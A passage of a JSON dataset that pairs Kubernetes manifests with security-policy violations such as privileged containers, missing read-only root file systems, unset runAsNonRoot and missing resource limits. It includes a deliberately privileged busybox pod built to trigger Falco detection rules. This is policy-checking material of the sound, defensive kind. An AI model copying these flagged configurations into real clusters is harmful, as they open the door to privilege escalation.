    "violation_text": "The container \"busybox\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8173",
    "manifest_path": "data/manifests/the_stack_sample/sample_3029.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: privileged-deployment\n  labels:\n    app.kubernetes.io/name: privileged-deployment\n    app.kubernetes.io/part-of: falco-event-generator\n    falco.rules: Create-Privileged-Pod\n    message: Creating-deployment-with-privileged-true-pod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: privileged-busybox\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: privileged-busybox\n        app.kubernetes.io/part-of: falco-event-generator\n    spec:\n      containers:\n      - securityContext:\n          privileged: true\n        name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        - -c\n        - while true; do echo sleeping; sleep 3600; done\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox\" does not have a read-only root file system"
  },
  {
    "id": "8174",
    "manifest_path": "data/manifests/the_stack_sample/sample_3029.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: privileged-deployment\n  labels:\n    app.kubernetes.io/name: privileged-deployment\n    app.kubernetes.io/part-of: falco-event-generator\n    falco.rules: Create-Privileged-Pod\n    message: Creating-deployment-with-privileged-true-pod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: privileged-busybox\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: privileged-busybox\n        app.kubernetes.io/part-of: falco-event-generator\n    spec:\n      containers:\n      - securityContext:\n          privileged: true\n        name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        - -c\n        - while true; do echo sleeping; sleep 3600; done\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"busybox\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "8175",
    "manifest_path": "data/manifests/the_stack_sample/sample_3029.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: privileged-deployment\n  labels:\n    app.kubernetes.io/name: privileged-deployment\n    app.kubernetes.io/part-of: falco-event-generator\n    falco.rules: Create-Privileged-Pod\n    message: Creating-deployment-with-privileged-true-pod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: privileged-busybox\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: privileged-busybox\n        app.kubernetes.io/part-of: falco-event-generator\n    spec:\n      containers:\n      - securityContext:\n          privileged: true\n        name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        - -c\n        - while true; do echo sleeping; sleep 3600; done\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"busybox\" is privileged"
  },
  {
    "id": "8176",
    "manifest_path": "data/manifests/the_stack_sample/sample_3029.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: privileged-deployment\n  labels:\n    app.kubernetes.io/name: privileged-deployment\n    app.kubernetes.io/part-of: falco-event-generator\n    falco.rules: Create-Privileged-Pod\n    message: Creating-deployment-with-privileged-true-pod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: privileged-busybox\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: privileged-busybox\n        app.kubernetes.io/part-of: falco-event-generator\n    spec:\n      containers:\n      - securityContext:\n          privileged: true\n        name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        - -c\n        - while true; do echo sleeping; sleep 3600; done\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox\" is not set to runAsNonRoot"
  },
  {
    "id": "8177",
    "manifest_path": "data/manifests/the_stack_sample/sample_3029.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: privileged-deployment\n  labels:\n    app.kubernetes.io/name: privileged-deployment\n    app.kubernetes.io/part-of: falco-event-generator\n    falco.rules: Create-Privileged-Pod\n    message: Creating-deployment-with-privileged-true-pod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: privileged-busybox\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: privileged-busybox\n        app.kubernetes.io/part-of: falco-event-generator\n    spec:\n      containers:\n      - securityContext:\n          privileged: true\n        name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        - -c\n        - while true; do echo sleeping; sleep 3600; done\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox\" has cpu request 0"
  },
  {
    "id": "8178",
    "manifest_path": "data/manifests/the_stack_sample/sample_3029.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: privileged-deployment\n  labels:\n    app.kubernetes.io/name: privileged-deployment\n    app.kubernetes.io/part-of: falco-event-generator\n    falco.rules: Create-Privileged-Pod\n    message: Creating-deployment-with-privileged-true-pod\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: privileged-busybox\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: privileged-busybox\n        app.kubernetes.io/part-of: falco-event-generator\n    spec:\n      containers:\n      - securityContext:\n          privileged: true\n        name: busybox\n        image: busybox\n        command:\n        - /bin/sh\n        - -c\n        - while true; do echo sleeping; sleep 3600; done\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox\" has memory limit 0"
  },
  {
    "id": "8179",
    "manifest_path": "data/manifests/the_stack_sample/sample_3031.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: prometheus-server\nspec:\n  ports:\n  - port: 9090\n    targetPort: 9090\n",
    "policy_id": "dangling-service",
    "violation_text": "service has no selector specified"
  },
  {
    "id": "8180",
    "manifest_path": "data/manifests/the_stack_sample/sample_3033.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: monitor-prow-controller\n  namespace: prow\n  labels:\n    app: monitor-prow-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: monitor-prow-controller\n  template:\n    metadata:\n      labels:\n        app: monitor-prow-controller\n    spec:\n      serviceAccountName: monitor-prow-controller\n      containers:\n      - name: monitor-prow-controller\n        image: quay.io/powercloud/all-in-one:0.2\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - \"KCTL=\\\"kubectl -n prow\\\"\\nwhile true;do\\n    date\\n    $KCTL logs deployment/prow-controller-manager\\\n          \\ | grep \\\"Failed to get API Group-Resources\\\"\\n    if [[ $? -eq 0 ]]; then\\n\\\n          \\        echo \\\"prow-controller-manager got errors, restarting the deployment..\\\"\\\n          \\n        $KCTL scale deployment prow-controller-manager --replicas=0\\n\\\n          \\        $KCTL scale deployment prow-controller-manager --replicas=1\\n \\\n          \\   else\\n        echo \\\"prow-controller-manager deployment is in healthy\\\n          \\ state\\\"\\n    fi\\n    sleep 300\\ndone\"\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monitor-prow-controller\" does not have a read-only root file system"
  },
  {
    "id": "8181",
    "manifest_path": "data/manifests/the_stack_sample/sample_3033.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: monitor-prow-controller\n  namespace: prow\n  labels:\n    app: monitor-prow-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: monitor-prow-controller\n  template:\n    metadata:\n      labels:\n        app: monitor-prow-controller\n    spec:\n      serviceAccountName: monitor-prow-controller\n      containers:\n      - name: monitor-prow-controller\n        image: quay.io/powercloud/all-in-one:0.2\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - \"KCTL=\\\"kubectl -n prow\\\"\\nwhile true;do\\n    date\\n    $KCTL logs deployment/prow-controller-manager\\\n          \\ | grep \\\"Failed to get API Group-Resources\\\"\\n    if [[ $? -eq 0 ]]; then\\n\\\n          \\        echo \\\"prow-controller-manager got errors, restarting the deployment..\\\"\\\n          \\n        $KCTL scale deployment prow-controller-manager --replicas=0\\n\\\n          \\        $KCTL scale deployment prow-controller-manager --replicas=1\\n \\\n          \\   else\\n        echo \\\"prow-controller-manager deployment is in healthy\\\n          \\ state\\\"\\n    fi\\n    sleep 300\\ndone\"\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"monitor-prow-controller\" not found"
  },
  {
    "id": "8182",
    "manifest_path": "data/manifests/the_stack_sample/sample_3033.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: monitor-prow-controller\n  namespace: prow\n  labels:\n    app: monitor-prow-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: monitor-prow-controller\n  template:\n    metadata:\n      labels:\n        app: monitor-prow-controller\n    spec:\n      serviceAccountName: monitor-prow-controller\n      containers:\n      - name: monitor-prow-controller\n        image: quay.io/powercloud/all-in-one:0.2\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - \"KCTL=\\\"kubectl -n prow\\\"\\nwhile true;do\\n    date\\n    $KCTL logs deployment/prow-controller-manager\\\n          \\ | grep \\\"Failed to get API Group-Resources\\\"\\n    if [[ $? -eq 0 ]]; then\\n\\\n          \\        echo \\\"prow-controller-manager got errors, restarting the deployment..\\\"\\\n          \\n        $KCTL scale deployment prow-controller-manager --replicas=0\\n\\\n          \\        $KCTL scale deployment prow-controller-manager --replicas=1\\n \\\n          \\   else\\n        echo \\\"prow-controller-manager deployment is in healthy\\\n          \\ state\\\"\\n    fi\\n    sleep 300\\ndone\"\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monitor-prow-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "8183",
    "manifest_path": "data/manifests/the_stack_sample/sample_3033.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: monitor-prow-controller\n  namespace: prow\n  labels:\n    app: monitor-prow-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: monitor-prow-controller\n  template:\n    metadata:\n      labels:\n        app: monitor-prow-controller\n    spec:\n      serviceAccountName: monitor-prow-controller\n      containers:\n      - name: monitor-prow-controller\n        image: quay.io/powercloud/all-in-one:0.2\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - \"KCTL=\\\"kubectl -n prow\\\"\\nwhile true;do\\n    date\\n    $KCTL logs deployment/prow-controller-manager\\\n          \\ | grep \\\"Failed to get API Group-Resources\\\"\\n    if [[ $? -eq 0 ]]; then\\n\\\n          \\        echo \\\"prow-controller-manager got errors, restarting the deployment..\\\"\\\n          \\n        $KCTL scale deployment prow-controller-manager --replicas=0\\n\\\n          \\        $KCTL scale deployment prow-controller-manager --replicas=1\\n \\\n          \\   else\\n        echo \\\"prow-controller-manager deployment is in healthy\\\n          \\ state\\\"\\n    fi\\n    sleep 300\\ndone\"\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monitor-prow-controller\" has cpu request 0"
  },
  {
    "id": "8184",
    "manifest_path": "data/manifests/the_stack_sample/sample_3033.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: monitor-prow-controller\n  namespace: prow\n  labels:\n    app: monitor-prow-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: monitor-prow-controller\n  template:\n    metadata:\n      labels:\n        app: monitor-prow-controller\n    spec:\n      serviceAccountName: monitor-prow-controller\n      containers:\n      - name: monitor-prow-controller\n        image: quay.io/powercloud/all-in-one:0.2\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - \"KCTL=\\\"kubectl -n prow\\\"\\nwhile true;do\\n    date\\n    $KCTL logs deployment/prow-controller-manager\\\n          \\ | grep \\\"Failed to get API Group-Resources\\\"\\n    if [[ $? -eq 0 ]]; then\\n\\\n          \\        echo \\\"prow-controller-manager got errors, restarting the deployment..\\\"\\\n          \\n        $KCTL scale deployment prow-controller-manager --replicas=0\\n\\\n          \\        $KCTL scale deployment prow-controller-manager --replicas=1\\n \\\n          \\   else\\n        echo \\\"prow-controller-manager deployment is in healthy\\\n          \\ state\\\"\\n    fi\\n    sleep 300\\ndone\"\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monitor-prow-controller\" has memory limit 0"
  },
  {
    "id": "8185",
    "manifest_path": "data/manifests/the_stack_sample/sample_3036.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: uptimerobot\n    app.kubernetes.io/version: master\n  name: uptimerobot\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: uptimerobot\n  template:\n    metadata:\n      annotations:\n        checksum.config/md5: 9482c4e4a8cda7a10d594f51119c2087\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: uptimerobot\n        app.kubernetes.io/version: master\n    spec:\n      containers:\n      - args:\n        - --config.file\n        - /etc/json_exporter/config.yml\n        image: quay.io/prometheuscommunity/json-exporter:master\n        name: uptimerobot\n        ports:\n        - containerPort: 7979\n          name: http\n        readinessProbe:\n          failureThreshold: 5\n          initialDelaySeconds: 1\n          tcpSocket:\n            port: http\n          timeoutSeconds: 10\n        resources:\n          limits:\n            cpu: 20m\n            memory: 50Mi\n          requests:\n            cpu: 3m\n            memory: 16Mi\n        volumeMounts:\n        - mountPath: /etc/json_exporter/\n          name: uptimerobot\n          readOnly: true\n      serviceAccountName: uptimerobot\n      volumes:\n      - name: uptimerobot\n        secret:\n          secretName: uptimerobot\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"uptimerobot\" does not have a read-only root file system"
  },
  {
    "id": "8186",
    "manifest_path": "data/manifests/the_stack_sample/sample_3036.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: uptimerobot\n    app.kubernetes.io/version: master\n  name: uptimerobot\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: uptimerobot\n  template:\n    metadata:\n      annotations:\n        checksum.config/md5: 9482c4e4a8cda7a10d594f51119c2087\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: uptimerobot\n        app.kubernetes.io/version: master\n    spec:\n      containers:\n      - args:\n        - --config.file\n        - /etc/json_exporter/config.yml\n        image: quay.io/prometheuscommunity/json-exporter:master\n        name: uptimerobot\n        ports:\n        - containerPort: 7979\n          name: http\n        readinessProbe:\n          failureThreshold: 5\n          initialDelaySeconds: 1\n          tcpSocket:\n            port: http\n          timeoutSeconds: 10\n        resources:\n          limits:\n            cpu: 20m\n            memory: 50Mi\n          requests:\n            cpu: 3m\n            memory: 16Mi\n        volumeMounts:\n        - mountPath: /etc/json_exporter/\n          name: uptimerobot\n          readOnly: true\n      serviceAccountName: uptimerobot\n      volumes:\n      - name: uptimerobot\n        secret:\n          secretName: uptimerobot\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"uptimerobot\" not found"
  },
  {
    "id": "8187",
    "manifest_path": "data/manifests/the_stack_sample/sample_3036.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: uptimerobot\n    app.kubernetes.io/version: master\n  name: uptimerobot\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: uptimerobot\n  template:\n    metadata:\n      annotations:\n        checksum.config/md5: 9482c4e4a8cda7a10d594f51119c2087\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: uptimerobot\n        app.kubernetes.io/version: master\n    spec:\n      containers:\n      - args:\n        - --config.file\n        - /etc/json_exporter/config.yml\n        image: quay.io/prometheuscommunity/json-exporter:master\n        name: uptimerobot\n        ports:\n        - containerPort: 7979\n          name: http\n        readinessProbe:\n          failureThreshold: 5\n          initialDelaySeconds: 1\n          tcpSocket:\n            port: http\n          timeoutSeconds: 10\n        resources:\n          limits:\n            cpu: 20m\n            memory: 50Mi\n          requests:\n            cpu: 3m\n            memory: 16Mi\n        volumeMounts:\n        - mountPath: /etc/json_exporter/\n          name: uptimerobot\n          readOnly: true\n      serviceAccountName: uptimerobot\n      volumes:\n      - name: uptimerobot\n        secret:\n          secretName: uptimerobot\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"uptimerobot\" is not set to runAsNonRoot"
  },
  {
    "id": "8188",
    "manifest_path": "data/manifests/the_stack_sample/sample_3039.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pt-1.6-hf-glue-bert-b-c-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: pytorch-1.6\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\ngit clone --recursive -b r1.6 https://github.com/pytorch-tpu/examples.git\\n\\\n            cd examples/deps/transformers && pip install .\\ngit log -1\\npython examples/xla_spawn.py\\\n            \\ \\\\\\n  --num_cores 8 \\\\\\n  examples/text-classification/run_glue.py \\\\\\\n            \\n  --logging_dir=./tensorboard-metrics \\\\\\n  --task_name MNLI \\\\\\n  --data_dir\\\n            \\ /datasets/glue/MNLI \\\\\\n  --cache_dir ./cache_dir \\\\\\n  --do_train \\\\\\\n            \\n  --do_eval \\\\\\n  --num_train_epochs 3 \\\\\\n  --max_seq_length 128 \\\\\\\n            \\n  --learning_rate 3e-5 \\\\\\n  --output_dir MNLI \\\\\\n  --overwrite_output_dir\\\n            \\ \\\\\\n  --logging_steps 100 \\\\\\n  --save_steps 3000 \\\\\\n  --overwrite_cache\\\n            \\ \\\\\\n  --tpu_metrics_debug \\\\\\n --model_name_or_path bert-base-cased\\\n            \\ \\\\\\n--per_gpu_train_batch_size 64 \\\\\\n--per_gpu_eval_batch_size 64\\n\\\n            gsutil -m cp -r ./tensorboard-metrics/* $(MODEL_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: XLA_USE_BF16\n            value: '0'\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/pytorch-xla:r1.6\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: '12.0'\n              memory: 80Gi\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n          - mountPath: /datasets\n            name: pytorch-datasets-claim\n            readOnly: true\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"tags_to_ignore\\\": [\\n   \\\"LearningRate\\\"\\\n              \\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false,\\n  \\\"metric_subset_to_alert\\\"\\\n              : [\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\",\\n   \\\"total_wall_time\\\"\\\n              ,\\n   \\\"Accuracy/test_final\\\",\\n   \\\"aten_ops_sum_final\\\"\\n  ],\\n  \\\"\\\n              metric_success_conditions\\\": {\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"aten_ops_sum_final\\\": {\\n    \\\"comparison\\\": \\\"less_or_equal\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 0\\n   \\\n              \\ }\\n   },\\n   \\\"eval_mnli-mm/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"eval_mnli/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"total_wall_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 5\\n   \\\n              \\ },\\n    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"\\\n              test_name\\\": \\\"pt-1.6-hf-glue-bert-b-c-conv-v3-8\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n        - name: pytorch-datasets-claim\n          persistentVolumeClaim:\n            claimName: pytorch-datasets-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monitor\" does not have a read-only root file system"
  },
  {
    "id": "8189",
    "manifest_path": "data/manifests/the_stack_sample/sample_3039.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pt-1.6-hf-glue-bert-b-c-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: pytorch-1.6\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\ngit clone --recursive -b r1.6 https://github.com/pytorch-tpu/examples.git\\n\\\n            cd examples/deps/transformers && pip install .\\ngit log -1\\npython examples/xla_spawn.py\\\n            \\ \\\\\\n  --num_cores 8 \\\\\\n  examples/text-classification/run_glue.py \\\\\\\n            \\n  --logging_dir=./tensorboard-metrics \\\\\\n  --task_name MNLI \\\\\\n  --data_dir\\\n            \\ /datasets/glue/MNLI \\\\\\n  --cache_dir ./cache_dir \\\\\\n  --do_train \\\\\\\n            \\n  --do_eval \\\\\\n  --num_train_epochs 3 \\\\\\n  --max_seq_length 128 \\\\\\\n            \\n  --learning_rate 3e-5 \\\\\\n  --output_dir MNLI \\\\\\n  --overwrite_output_dir\\\n            \\ \\\\\\n  --logging_steps 100 \\\\\\n  --save_steps 3000 \\\\\\n  --overwrite_cache\\\n            \\ \\\\\\n  --tpu_metrics_debug \\\\\\n --model_name_or_path bert-base-cased\\\n            \\ \\\\\\n--per_gpu_train_batch_size 64 \\\\\\n--per_gpu_eval_batch_size 64\\n\\\n            gsutil -m cp -r ./tensorboard-metrics/* $(MODEL_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: XLA_USE_BF16\n            value: '0'\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/pytorch-xla:r1.6\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: '12.0'\n              memory: 80Gi\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n          - mountPath: /datasets\n            name: pytorch-datasets-claim\n            readOnly: true\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"tags_to_ignore\\\": [\\n   \\\"LearningRate\\\"\\\n              \\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false,\\n  \\\"metric_subset_to_alert\\\"\\\n              : [\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\",\\n   \\\"total_wall_time\\\"\\\n              ,\\n   \\\"Accuracy/test_final\\\",\\n   \\\"aten_ops_sum_final\\\"\\n  ],\\n  \\\"\\\n              metric_success_conditions\\\": {\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"aten_ops_sum_final\\\": {\\n    \\\"comparison\\\": \\\"less_or_equal\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 0\\n   \\\n              \\ }\\n   },\\n   \\\"eval_mnli-mm/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"eval_mnli/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"total_wall_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 5\\n   \\\n              \\ },\\n    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"\\\n              test_name\\\": \\\"pt-1.6-hf-glue-bert-b-c-conv-v3-8\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n        - name: pytorch-datasets-claim\n          persistentVolumeClaim:\n            claimName: pytorch-datasets-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"publisher\" does not have a read-only root file system"
  },
  {
    "id": "8190",
    "manifest_path": "data/manifests/the_stack_sample/sample_3039.yaml",
